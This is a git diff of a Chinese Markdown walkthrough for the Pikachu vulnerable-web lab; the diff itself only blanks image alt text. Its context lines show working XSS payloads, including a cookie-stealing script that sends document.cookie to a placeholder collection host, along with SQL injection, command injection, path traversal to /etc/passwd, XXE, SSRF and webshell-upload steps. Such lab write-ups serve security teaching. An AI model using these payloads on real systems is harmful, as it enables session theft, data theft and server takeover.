@@ -191,7 +191,7 @@ if(isset($_POST['submit'])) {
 
 burpsuite,抓个验证码输入正确的请求,就可以重复爆破了
 
-![image](../../../../assets/img/安全/实验/Misc/pikachu/1.png)
+![](../../../../assets/img/安全/实验/Misc/pikachu/1.png)
 
 ### 验证码绕过(on client)
 
@@ -313,21 +313,21 @@ set_token();
 
 burp 抓个正确的包,将以下两个设置为变量
 
-![image](../../../../assets/img/安全/实验/Misc/pikachu/2.png)
+![](../../../../assets/img/安全/实验/Misc/pikachu/2.png)
 
 在 Option 中的 Grep Extract 中点击 Add,在点击 Refetch response,找到返回的包,找到来自服务器返回的 token,为了便于查找可以在最下方的输入栏输入 token 直接找到 token 的值
 
-![image](../../../../assets/img/安全/实验/Misc/pikachu/3.png)
+![](../../../../assets/img/安全/实验/Misc/pikachu/3.png)
 
 选中 token 的值,复制,同时在选中状态下点击确定,同时在 Option 中的最下方勾选 always,并将线程设置为 1 ,如果不将线程设为1会出现报错
 
 接下来设置 Payloads,对密码的 Payloads 直接导入字典.
 
-![image](../../../../assets/img/安全/实验/Misc/pikachu/4.png)
+![](../../../../assets/img/安全/实验/Misc/pikachu/4.png)
 
 对 token 的 Payloads 的参数设置为 Recursive grep,同时在 Payload Options 选中第一项,并将之前复制的 token 值输入到下面的输入栏中.开始爆破.
 
-![image](../../../../assets/img/安全/实验/Misc/pikachu/5.png)
+![](../../../../assets/img/安全/实验/Misc/pikachu/5.png)
 
 后面略
 
@@ -356,7 +356,7 @@ XSS 是一种发生在前端浏览器端的漏洞,所以其危害的对象也是
 3. 通过搜索定位到唯一字符,结合唯一字符前后语法确认是否可以构造执行js的条件(构造闭合);提交构造的脚本代码,看是否可以成功执行,如果成功执行则说明存在XSS漏洞;
 
 ### 反射型 xss(get)
-![image](../../../../assets/img/安全/实验/Misc/pikachu/6.png)
+![](../../../../assets/img/安全/实验/Misc/pikachu/6.png)
 
 **服务器端核心代码**
 ```php
@@ -377,13 +377,13 @@ if(isset($_GET['submit'])){
 
 按流程来,为了找到输入点,先提交一组特殊字符+唯一识别字符,再去查看源代码
 
-![image](../../../../assets/img/安全/实验/Misc/pikachu/7.png)
+![](../../../../assets/img/安全/实验/Misc/pikachu/7.png)
 
 下图说明输入的字符被直接输入到了这个 P 标签中,这里就存在一个输出点
 
 F12 修改前端数量限制,输入 payload `<script>alert('沵咑礷赇潒礤蒣騉')</script>` 点击提交
 
-![image](../../../../assets/img/安全/实验/Misc/pikachu/8.png)
+![](../../../../assets/img/安全/实验/Misc/pikachu/8.png)
 
 刷新一次后就不会进行弹窗,说这仅仅是一次性.
 
@@ -444,7 +444,7 @@ if(array_key_exists('id', $_GET) && is_numeric($_GET['id'])){
 
 同之前的思路,先输入一组特殊字符+唯一识别字符,查看源代码,能发现输出点和反射性 XSS 是相同的.
 
-![image](../../../../assets/img/安全/实验/Misc/pikachu/9.png)
+![](../../../../assets/img/安全/实验/Misc/pikachu/9.png)
 
 输入 payload `<script>alert('老铁,欧里给!')</script>` 点击提交
 
@@ -486,7 +486,7 @@ object 文档对象,接着生成各个子文档对象,每个页面元素对应�
 
 payload 构造如下 `'> <marquee loop="99" onfinish=alert(1)>hack the planet</marquee>`
 
-![image](../../../../assets/img/安全/实验/Misc/pikachu/10.png)
+![](../../../../assets/img/安全/实验/Misc/pikachu/10.png)
 
 ### DOM 型 xss-x
 
@@ -544,7 +544,7 @@ XSS盲打就是攻击者在不知道后台是否存在 xss 漏洞的情况下,�
 
 输入 payload `<script>alert('老铁,欧里给!')</script>` ,观察到可注入点,以管理员的身份登入后台,就会出现弹窗,这就是一个简单的盲打.通过 xss 钓鱼的方法就能获取到 cookie,就能伪造管理员身份进行登陆了.
 
-![image](../../../../assets/img/安全/实验/Misc/pikachu/11.png)
+![](../../../../assets/img/安全/实验/Misc/pikachu/11.png)
 
 - 后台: http://<IP地址!!!>/pikachu/vul/xss/xssblind/admin_login.php
 - 账号密码: admin 123456
@@ -553,7 +553,7 @@ XSS盲打就是攻击者在不知道后台是否存在 xss 漏洞的情况下,�
 
 盗 cookie payload `<script>document.location = 'http://<xss平台地址>/pikachu/pkxss/xcookie/cookie.php?cookie=' + document.cookie;</script>`
 
-![image](../../../../assets/img/安全/实验/Misc/pikachu/12.png)
+![](../../../../assets/img/安全/实验/Misc/pikachu/12.png)
 
 ### xss 之过滤
 
@@ -609,13 +609,13 @@ if(isset($_GET['submit'])){
 
 先输入被预定义的字符 `&<s>"11<>11'123<123>`,在前端查看代码观察有是否有过滤掉单引号或双引号
 
-![image](../../../../assets/img/安全/实验/Misc/pikachu/13.png)
+![](../../../../assets/img/安全/实验/Misc/pikachu/13.png)
 
 可见单引号后面的出来了
 
 构造个 payload `'onclick='alert(1)'`
 
-![image](../../../../assets/img/安全/实验/Misc/pikachu/14.png)
+![](../../../../assets/img/安全/实验/Misc/pikachu/14.png)
 
 ### xss 之 href 输出
 
@@ -640,11 +640,11 @@ if(isset($_GET['submit'])){
 
 先输入一些字符串 `&<s>"11<>11'123<123>`,查看前端的源代码,发现输入的字符都被转义了.但 `<a>` 标签的 href 属性也是可以执行 JS 表达式的
 
-![image](../../../../assets/img/安全/实验/Misc/pikachu/15.png)
+![](../../../../assets/img/安全/实验/Misc/pikachu/15.png)
 
 构造个 payload `Javascript:alert('1')`
 
-![image](../../../../assets/img/安全/实验/Misc/pikachu/16.png)
+![](../../../../assets/img/安全/实验/Misc/pikachu/16.png)
 
 ### xss 之 js 输出
 
@@ -677,11 +677,11 @@ if(isset($_GET['submit']) && $_GET['message'] !=null){
 
 先输入一些字符串 `&<s>"11<>11'123<123>`,查看前端的源代码
 
-![image](../../../../assets/img/安全/实验/Misc/pikachu/17.png)
+![](../../../../assets/img/安全/实验/Misc/pikachu/17.png)
 
 对于 JS 代码,我们需要构造一个闭合,根据显示的代码构造 payload `abc'</script><script>alert(1)</script>`
 
-![image](../../../../assets/img/安全/实验/Misc/pikachu/18.png)
+![](../../../../assets/img/安全/实验/Misc/pikachu/18.png)
 
 ---
 
@@ -702,7 +702,7 @@ if(isset($_GET['submit']) && $_GET['message'] !=null){
 
 首先进行登陆,修改一下个人信息,并到 Brup Suite 上进行抓包,将抓到的 URL 进行修改(由自己作为攻击者),再发送给攻击目标(由自己作为被攻击者)
 
-![image](../../../../assets/img/安全/实验/Misc/pikachu/19.png)
+![](../../../../assets/img/安全/实验/Misc/pikachu/19.png)
 
 **漏洞利用**
 
@@ -710,7 +710,7 @@ if(isset($_GET['submit']) && $_GET['message'] !=null){
 
 `http://<服务器IP!!!>/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=futa&phonenum=110&add=123&email=lili%40pikachu.com1&submit=submit`
 
-![image](../../../../assets/img/安全/实验/Misc/pikachu/20.png)
+![](../../../../assets/img/安全/实验/Misc/pikachu/20.png)
 
 ### CSRF(POST)
 
@@ -720,7 +720,7 @@ if(isset($_GET['submit']) && $_GET['message'] !=null){
 
 直接从 burp 生成 poc 表单
 
-![image](../../../../assets/img/安全/实验/Misc/pikachu/21.png)
+![](../../../../assets/img/安全/实验/Misc/pikachu/21.png)
 
 ```html
 <html>
@@ -739,13 +739,13 @@ if(isset($_GET['submit']) && $_GET['message'] !=null){
 </html>
 ```
 
-![image](../../../../assets/img/安全/实验/Misc/pikachu/22.png)
+![](../../../../assets/img/安全/实验/Misc/pikachu/22.png)
 
 ### CSRF Token
 
 要抵御 CSRF,关键在于在请求中放入攻击者不能伪造的信息,且该信息不存在于 cookie 之中.故每次请求都可以加入一个随机码,且后台要对这个随机码进行验证.
 
-![image](../../../../assets/img/安全/实验/Misc/pikachu/23.png)
+![](../../../../assets/img/安全/实验/Misc/pikachu/23.png)
 
 **漏洞利用**
 
@@ -792,7 +792,7 @@ if(isset($_POST['submit']) && $_POST['id']!=null){
 
 抓包,查看 post 参数
 
-![image](../../../../assets/img/安全/实验/Misc/pikachu/26.png)
+![](../../../../assets/img/安全/实验/Misc/pikachu/26.png)
 
 构造 payload
 
@@ -800,7 +800,7 @@ if(isset($_POST['submit']) && $_POST['id']!=null){
 
 `1 or 1 =1` 未报错,存在数字型注入
 
-![image](../../../../assets/img/安全/实验/Misc/pikachu/27.png)
+![](../../../../assets/img/安全/实验/Misc/pikachu/27.png)
 
 ### 字符型注入(get)
 
@@ -831,7 +831,7 @@ if(isset($_GET['submit']) && $_GET['name']!=null){
 
 `http://<IP address!!!>/pikachu/vul/sqli/sqli_str.php?name=1' or '1' ='1&submit=%E6%9F%A5%E8%AF%A2`
 
-![image](../../../../assets/img/安全/实验/Misc/pikachu/28.png)
+![](../../../../assets/img/安全/实验/Misc/pikachu/28.png)
 
 ### 搜索型注入
 
@@ -875,7 +875,7 @@ union 操作符用于合并两个或多个 SQL 语句集合起来,得到联合�
 
 以 pikachu 平台的数据库为例,输入 `select id,email from member where username='kevin' union select username,pw from member where id=1` ;查看查询结果.
 
-![image](../../../../assets/img/安全/实验/Misc/pikachu/29.png)
+![](../../../../assets/img/安全/实验/Misc/pikachu/29.png)
 
 但是联合多个 SQL 语句时可能出现报错,因为查询的字段不能超过主查询的字段,这个时候可以在 SQL 语句后面加 order by 进行排序,通过这个办法可以判断主查询的字段.返回 pikachu 平台,在 SQL 注入下随意打开搜索型栏目,输入我们构造的 order by 语句进行测试.
 
@@ -885,26 +885,26 @@ union 操作符用于合并两个或多个 SQL 语句集合起来,得到联合�
 
 构造 payload: `a' union select database(),user(),version()#%`
 
-![image](../../../../assets/img/安全/实验/Misc/pikachu/30.png)
+![](../../../../assets/img/安全/实验/Misc/pikachu/30.png)
 
 **information_schema 注入**
 
 information_schema 数据库是 MySQL 系统自带的数据库.其中保存着关于 MySQL 服务器所维护的所有其他数据库的信息.通过 information_schema 注入,我们可以将整个数据库内容全部窃取出来.接下来是对 information_schema 注入的演示.
 首先同之前的步骤,使用 order by 来判断查询的字段.先找出数据库的名称,输入 `a' union select database(),user(),4#%` 得到反馈,判断数据库名称为 pikachu.
 
-![image](../../../../assets/img/安全/实验/Misc/pikachu/31.png)
+![](../../../../assets/img/安全/实验/Misc/pikachu/31.png)
 
 获取表名,输入:`a' union select table_schema,table_name,2 from information_schema.tables where table_schema='pikachu'#`
 
-![image](../../../../assets/img/安全/实验/Misc/pikachu/32.png)
+![](../../../../assets/img/安全/实验/Misc/pikachu/32.png)
 
 获取字段名,输入:`a'union select table_name,column_name,2 from information_schema.columns where table_name='users'#%`
 
-![image](../../../../assets/img/安全/实验/Misc/pikachu/33.png)
+![](../../../../assets/img/安全/实验/Misc/pikachu/33.png)
 
 获取数据,输入:`a'union select username ,password,4 from users#%`
 
-![image](../../../../assets/img/安全/实验/Misc/pikachu/34.png)
+![](../../../../assets/img/安全/实验/Misc/pikachu/34.png)
 
 **select 下的报错演示**
 
@@ -925,33 +925,33 @@ select/insert/update/delete 都可以使用报错来获取信息.
 
 获取数据库表名,输入:`a' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='pikachu')),0)#` ,但是反馈回的错误表示只能显示一行,所以采用 limit 来一行一行显示
 
-![image](../../../../assets/img/安全/实验/Misc/pikachu/35.png)
+![](../../../../assets/img/安全/实验/Misc/pikachu/35.png)
 
 输入 `a' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='pikachu'limit 0,1)),0)#` 更改limit后面的数字pikachu'limit 0,爆表名
 
-![image](../../../../assets/img/安全/实验/Misc/pikachu/36.png)
+![](../../../../assets/img/安全/实验/Misc/pikachu/36.png)
 
-![image](../../../../assets/img/安全/实验/Misc/pikachu/37.png)
+![](../../../../assets/img/安全/实验/Misc/pikachu/37.png)
 
-![image](../../../../assets/img/安全/实验/Misc/pikachu/38.png)
+![](../../../../assets/img/安全/实验/Misc/pikachu/38.png)
 
 字段名 `a' and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='users'limit 0,1)),0)#` 更改limit后面的数字,爆表名
 
-![image](../../../../assets/img/安全/实验/Misc/pikachu/39.png)
+![](../../../../assets/img/安全/实验/Misc/pikachu/39.png)
 
-![image](../../../../assets/img/安全/实验/Misc/pikachu/40.png)
+![](../../../../assets/img/安全/实验/Misc/pikachu/40.png)
 
-![image](../../../../assets/img/安全/实验/Misc/pikachu/41.png)
+![](../../../../assets/img/安全/实验/Misc/pikachu/41.png)
 
-![image](../../../../assets/img/安全/实验/Misc/pikachu/42.png)
+![](../../../../assets/img/安全/实验/Misc/pikachu/42.png)
 
 数据 `a' and updatexml(1,concat(0x7e,(select username from users limit 0,1)),0)#`
 
-![image](../../../../assets/img/安全/实验/Misc/pikachu/43.png)
+![](../../../../assets/img/安全/实验/Misc/pikachu/43.png)
 
 数据 `a' and updatexml(1,concat(0x7e,(select password from users limit 0,1)),0)#`
 
-![image](../../../../assets/img/安全/实验/Misc/pikachu/44.png)
+![](../../../../assets/img/安全/实验/Misc/pikachu/44.png)
 
 ### xx 型注入
 
@@ -1014,29 +1014,29 @@ if(isset($_POST['submit'])){
 
 先测 insert 注入,在注册页面输入 `'` ,来查看后端反馈的观察,通过观察报错了解到提交的内容在后台参与了拼接.
 
-![image](../../../../assets/img/安全/实验/Misc/pikachu/45.png)
+![](../../../../assets/img/安全/实验/Misc/pikachu/45.png)
 
 版本 `1' or updatexml(1,concat(0x7e,(version())),0) or'')#`
 
 表名 `1' or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='pikachu'limit 0,1)),0) or'')#`
 
-![image](../../../../assets/img/安全/实验/Misc/pikachu/46.png)
+![](../../../../assets/img/安全/实验/Misc/pikachu/46.png)
 
 老规矩,改 limit 后的数字
 
 字段名 `1' or updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='users'limit 0,1)),0) or'')#`
 
-![image](../../../../assets/img/安全/实验/Misc/pikachu/47.png)
+![](../../../../assets/img/安全/实验/Misc/pikachu/47.png)
 
 老规矩,改 limit 后的数字
 
 数据 `1' or updatexml(1,concat(0x7e,(select username from users limit 0,1)),0) or'')#`
 
-![image](../../../../assets/img/安全/实验/Misc/pikachu/48.png)
+![](../../../../assets/img/安全/实验/Misc/pikachu/48.png)
 
 数据 `1' or updatexml(1,concat(0x7e,(select password from users limit 0,1)),0) or'')#`
 
-![image](../../../../assets/img/安全/实验/Misc/pikachu/49.png)
+![](../../../../assets/img/安全/实验/Misc/pikachu/49.png)
 
 下面测试 update
 
@@ -1066,9 +1066,9 @@ if(isset($_POST['submit'])){
 
 例如我的: `1'or updatexml(2,concat(0x7e,(version())),0) or'' where username = 123;#`
 
-![image](../../../../assets/img/安全/实验/Misc/pikachu/50.png)
+![](../../../../assets/img/安全/实验/Misc/pikachu/50.png)
 
-![image](../../../../assets/img/安全/实验/Misc/pikachu/51.png)
+![](../../../../assets/img/安全/实验/Misc/pikachu/51.png)
 
 后面爆剩下的略,累了
 
@@ -1099,9 +1099,9 @@ if(array_key_exists('id', $_GET)){
 
 通过 Burp Suite 中自带的 URL 转换编码来转换替换 ID
 
-![image](../../../../assets/img/安全/实验/Misc/pikachu/53.png)
+![](../../../../assets/img/安全/实验/Misc/pikachu/53.png)
 
-![image](../../../../assets/img/安全/实验/Misc/pikachu/52.png)
+![](../../../../assets/img/安全/实验/Misc/pikachu/52.png)
 
 后面略
 
@@ -1119,15 +1119,15 @@ if(isset($_GET['logout']) && $_GET['logout'] == 1){
 
 **漏洞利用**
 
-![image](../../../../assets/img/安全/实验/Misc/pikachu/54.png)
+![](../../../../assets/img/安全/实验/Misc/pikachu/54.png)
 
 登陆后去 Burp 中找到登陆的 GET 请求,把请求发送到 Repeater 模块中,去除 User-Agent:,然后输入 `'`s 然后运行后观察 MYSQL 语法报错然后发现存在 SQL 注入漏洞.
 
-![image](../../../../assets/img/安全/实验/Misc/pikachu/55.png)
+![](../../../../assets/img/安全/实验/Misc/pikachu/55.png)
 
 爆库名 payload: `firefox' or updatexml(1,concat(0x7e,database ()),0) or '`
 
-![image](../../../../assets/img/安全/实验/Misc/pikachu/56.png)
+![](../../../../assets/img/安全/实验/Misc/pikachu/56.png)
 
 后面略
 
@@ -1248,7 +1248,7 @@ id 的参数传入代码层,就会在 `’` 前加一个 `\`,由于采用的 URL
 
 因为 `%df` 的关系,`\` 的编码 `%5c` 被吃掉了,也就失去了转义的效果,直接被带入到 mysql 中,然后 mysql 在解读时无视了 `%a0%5c` 形成的新字节,那么单引号便重新发挥了效果
 
-![image](../../../../assets/img/安全/实验/Misc/pikachu/57.png) 这作者写提示就 TM 玩似的,太不友好了
+![](../../../../assets/img/安全/实验/Misc/pikachu/57.png) 这作者写提示就 TM 玩似的,太不友好了
 
 - 测试payload: `lili%df' or 1=1 #`
 - 测试payload: `lili%df%27%20or%201=1%23`
@@ -1257,7 +1257,7 @@ id 的参数传入代码层,就会在 `’` 前加一个 `\`,由于采用的 URL
 
 - 爆表payload: `lili%df' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #`
 
-![image](../../../../assets/img/安全/实验/Misc/pikachu/58.png)
+![](../../../../assets/img/安全/实验/Misc/pikachu/58.png)
 
 - 后面略
 
@@ -1295,7 +1295,7 @@ if(isset($_POST['submit']) && $_POST['ipaddress']!=null){
 - payload: `127.0.0.1 & ipconfig`
 - payload: `127.0.0.1 | ipconfig`
 
-![image](../../../../assets/img/安全/实验/Misc/pikachu/24.png)
+![](../../../../assets/img/安全/实验/Misc/pikachu/24.png)
 
 ### exec "eval"
 
@@ -1320,7 +1320,7 @@ if(isset($_POST['submit']) && $_POST['txt'] != null){
 
 如果后台对输入没有处理,那么我们输入一个php代码:`phpinfo();` ,就会直接执行代码而不是返回正确的窗口
 
-![image](../../../../assets/img/安全/实验/Misc/pikachu/25.png)
+![](../../../../assets/img/安全/实验/Misc/pikachu/25.png)
 
 ---
 
@@ -1421,11 +1421,11 @@ if(isset($_POST['submit'])){
 
 说只允许上传图片文件,那么查看前端代码,当页面发生改变时,会调用这个checkFileExt函数来检查上传的是不是图片
 
-![image](../../../../assets/img/安全/实验/Misc/pikachu/59.png)
+![](../../../../assets/img/安全/实验/Misc/pikachu/59.png)
 
 这里可以把文件先改成图片的后缀名,然后抓包修改后缀上传
 
-![image](../../../../assets/img/安全/实验/Misc/pikachu/60.png)
+![](../../../../assets/img/安全/实验/Misc/pikachu/60.png)
 
 ### MIME type
 
@@ -1483,7 +1483,7 @@ if(isset($_POST['submit'])){
 
 这里将 txt 的 Content-Type 改为图片的 Content-Type ,测试,成功上传
 
-![image](../../../../assets/img/安全/实验/Misc/pikachu/61.png)
+![](../../../../assets/img/安全/实验/Misc/pikachu/61.png)
 
 ### getimagesize
 
@@ -1511,11 +1511,11 @@ if(isset($_POST['submit'])){
 
 burp转发上传
 
-![image](../../../../assets/img/安全/实验/Misc/pikachu/62.png)
+![](../../../../assets/img/安全/实验/Misc/pikachu/62.png)
 
 蚁剑连接
 
-![image](../../../../assets/img/安全/实验/Misc/pikachu/63.png)
+![](../../../../assets/img/安全/实验/Misc/pikachu/63.png)
 
 ---
 
@@ -1541,7 +1541,7 @@ burp转发上传
 
 用 admin 登录一下,创建个账号 123456,然后退出,账号用 pikachu 登录,将之前创建账号 123 的请求在 burp 里转发,用 pikachu 的 cookie 覆盖之前 admin 的 cookie,可以发现 123 被重复创建了
 
-![image](../../../../assets/img/安全/实验/Misc/pikachu/64.png)
+![](../../../../assets/img/安全/实验/Misc/pikachu/64.png)
 
 ---
 
@@ -1557,7 +1557,7 @@ burp转发上传
 
 payload: `http://<IP address !!!>/pikachu/vul/dir/dir_list.php?title=../../../../../../../../../1.txt`
 
-![image](../../../../assets/img/安全/实验/Misc/pikachu/75.png)
+![](../../../../assets/img/安全/实验/Misc/pikachu/75.png)
 
 linux payload: `http://<IP address !!!>/pikachu/vul/dir/dir_list.php?title=../../../../../../../../../etc/passwd`
 
@@ -1576,7 +1576,7 @@ linux payload: `http://<IP address !!!>/pikachu/vul/dir/dir_list.php?title=../..
 
 直接 F12 查看源代码
 
-![image](../../../../assets/img/安全/实验/Misc/pikachu/74.png)
+![](../../../../assets/img/安全/实验/Misc/pikachu/74.png)
 
 ---
 
@@ -1675,11 +1675,11 @@ if(isset($_POST['o'])){
 
 payload: `O:1:"S":1:{s:4:"test";s:29:"<script>alert('xss')</script>";}`
 
-![image](../../../../assets/img/安全/实验/Misc/pikachu/65.png)
+![](../../../../assets/img/安全/实验/Misc/pikachu/65.png)
 
 回到平台提交 payload 就会触发弹窗
 
-![image](../../../../assets/img/安全/实验/Misc/pikachu/66.png)
+![](../../../../assets/img/安全/实验/Misc/pikachu/66.png)
 
 ---
 
@@ -1689,11 +1689,11 @@ payload: `O:1:"S":1:{s:4:"test";s:29:"<script>alert('xss')</script>";}`
 
 如果你了解 XML,你可以把 XML 理解为一个用来定义数据的东东.因此,两个采用不同技术的系统可以通过 XML 进行通信和交换数据. 比如,下图就是一个用来描述一个职工的 XML 文档样本,其中的’name’,'salary’,'address’ 被称为 XML 的元素.
 
-![image](../../../../assets/img/安全/实验/Misc/pikachu/67.png)
+![](../../../../assets/img/安全/实验/Misc/pikachu/67.png)
 
 有些 XML 文档包含 system 标识符定义的"实体",这些 XML 文档会在 DOCTYPE 头部标签中呈现.这些定义的’实体’能够访问本地或者远程的内容.比如,下面的 XML 文档样例就包含了XML ‘实体’.
 
-![image](../../../../assets/img/安全/实验/Misc/pikachu/68.png)
+![](../../../../assets/img/安全/实验/Misc/pikachu/68.png)
 
 在上面的代码中, XML 外部实体 ‘entityex’ 被赋予的值为:file://etc/passwd.在解析 XML 文档的过程中,实体’entityex’的值会被替换为 URI(file://etc/passwd)内容值(也就是 passwd 文件的内容). 关键字’SYSTEM’会告诉 XML 解析器,’entityex’实体的值将从其后的 URI 中读取.因此,XML 实体被使用的次数越多,越有帮助.
 
@@ -1701,7 +1701,7 @@ payload: `O:1:"S":1:{s:4:"test";s:29:"<script>alert('xss')</script>";}`
 
 XXE -"xml external entity injection"既"xml外部实体注入漏洞".有了 XML 实体,关键字’SYSTEM’会令 XML 解析器从 URI 中读取内容,并允许它在 XML 文档中被替换.因此,攻击者可以通过实体将他自定义的值发送给应用程序,然后让应用程序去呈现. 简单来说,攻击者强制 XML 解析器去访问攻击者指定的资源内容(可能是系统上本地文件亦或是远程系统上的文件).比如,下面的代码将获取系统上 folder/file 的内容并呈献给用户.
 
-![image](../../../../assets/img/安全/实验/Misc/pikachu/69.png)
+![](../../../../assets/img/安全/实验/Misc/pikachu/69.png)
 
 概括一下就是"攻击者通过向服务器注入指定的 xml 实体内容,从而让服务器按照指定的配置进行执行,导致问题",也就是说服务端接收和解析了来自用户端的 xml 数据,而又没有做严格的安全控制,从而导致 xml 外部实体注入.
 
@@ -1730,7 +1730,7 @@ if(isset($_POST['submit']) and $_POST['xml'] != null){
 <name>&hacker;</name>
 ```
 
-![image](../../../../assets/img/安全/实验/Misc/pikachu/70.png)
+![](../../../../assets/img/安全/实验/Misc/pikachu/70.png)
 
 payload,请先确定目标路径有这个文件
 ```xml
@@ -1740,7 +1740,7 @@ payload,请先确定目标路径有这个文件
 <name>&aaa;</name>
 ```
 
-![image](../../../../assets/img/安全/实验/Misc/pikachu/71.png)
+![](../../../../assets/img/安全/实验/Misc/pikachu/71.png)
 
 在 linux 下还可以输入这样的 payload
 ```XML
@@ -1823,7 +1823,7 @@ if(isset($_GET['url']) && $_GET['url'] != null){
 
 看起来就像远程包含漏洞一样,尝试构造 payload: `http://<IP address !!!>/pikachu/vul/ssrf/ssrf_curl.php?url=http://www.baidu.com`
 
-![image](../../../../assets/img/安全/实验/Misc/pikachu/72.png)
+![](../../../../assets/img/安全/实验/Misc/pikachu/72.png)
 
 SSRF 利用方式有很多,比较常见的是服务端请求其他网站,一种是探测内网敏感信息,还有就是攻击 web 应用,主要是 strust2 远程命令执行,还有一些中间件的 getshell.
 
@@ -1831,7 +1831,7 @@ payload: `http://<IP address !!!>/pikachu/vul/ssrf/ssrf_curl.php?url=file:///c:/
 
 payload: `http://<IP address !!!>/pikachu/vul/ssrf/ssrf_curl.php?url=dict://127.0.0.1:80/info`
 
-![image](../../../../assets/img/安全/实验/Misc/pikachu/73.png)
+![](../../../../assets/img/安全/实验/Misc/pikachu/73.png)
 
 ### SSRF(file_get_content)
 
